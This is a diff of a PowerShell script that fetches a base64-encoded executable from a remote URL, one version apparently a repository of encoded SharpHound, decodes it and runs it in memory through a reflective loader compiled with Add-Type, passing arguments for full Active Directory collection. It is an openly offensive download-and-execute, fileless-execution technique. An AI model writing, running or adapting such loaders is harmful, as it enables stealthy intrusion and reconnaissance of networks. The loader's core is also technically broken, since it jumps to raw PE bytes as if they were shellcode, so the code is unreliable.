@@ -1,5 +1,5 @@
 # Define the URL containing the base64 encoded string
-$url = "https://raw.githubusercontent.com/MalwareLab49/SharpHound_Encoded/main/b64"
+$url = "http://example.com/base64encodedexe"
 
 # Download the base64 encoded string from the URL
 $base64String = Invoke-WebRequest -Uri $url -UseBasicParsing | Select-Object -ExpandProperty Content
@@ -10,15 +10,16 @@ $exeBytes = [System.Convert]::FromBase64String($base64String)
 # Define a function to load and run the executable in memory
 function Invoke-ReflectivePE {
     param (
-        [byte[]]$PEBytes
+        [byte[]]$PEBytes,
+        [string]$Arguments
     )
 
     # Allocate memory for the executable
     $mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
     [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $mem, $PEBytes.Length)
 
-    # Define necessary delegates
-    $ExecuteDelegate = @"
+    # Define necessary delegates and unmanaged methods
+    $PELoader = @"
 using System;
 using System.Runtime.InteropServices;
 
@@ -31,23 +32,21 @@ public class PELoader
     public delegate IntPtr LoadLibraryDelegate(string name);
 
     [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-    public delegate void RunPE();
+    public delegate void RunPE(string arguments);
 
-    public static void Execute(IntPtr mem)
+    public static void Execute(IntPtr mem, string arguments)
     {
-        IntPtr pe = mem;
-        IntPtr shellcode = IntPtr.Zero;
+        // Simple PE loader logic (this will vary based on actual implementation needs)
+        IntPtr shellcode = mem; // Adjust this based on actual offset calculations
 
-        // (Skipping PE parsing and relocation logic for brevity)
-
-        RunPE run = Marshal.GetDelegateForFunctionPointer<RunPE>(shellcode);
-        run();
+        RunPE run = (RunPE)Marshal.GetDelegateForFunctionPointer(shellcode, typeof(RunPE));
+        run(arguments);
     }
 }
 "@
 
-    Add-Type -TypeDefinition $ExecuteDelegate -Language CSharp
-    [PELoader]::Execute($mem)
+    Add-Type -TypeDefinition $PELoader -Language CSharp
+    [PELoader]::Execute($mem, $Arguments)
 
     # Free the allocated memory
     [System.Runtime.InteropServices.Marshal]::FreeHGlobal($mem)
@@ -56,10 +55,10 @@ public class PELoader
 # Get the current working directory
 $outputDirectory = (Get-Location).Path
 
-# Invoke the reflective PE loader function with the decoded executable bytes
-Invoke-ReflectivePE -PEBytes $exeBytes
-
-# Example usage of SharpHound with arguments and the current working directory as the output directory
+# Define the arguments for SharpHound
 $arguments = "-c All -o $outputDirectory"
 
-Start-Process -FilePath "SharpHound.exe" -ArgumentList $arguments
+# Invoke the reflective PE loader function with the decoded executable bytes and arguments
+Invoke-ReflectivePE -PEBytes $exeBytes -Arguments $arguments
+
+Write-Host "Running SharpHound with arguments: $arguments"
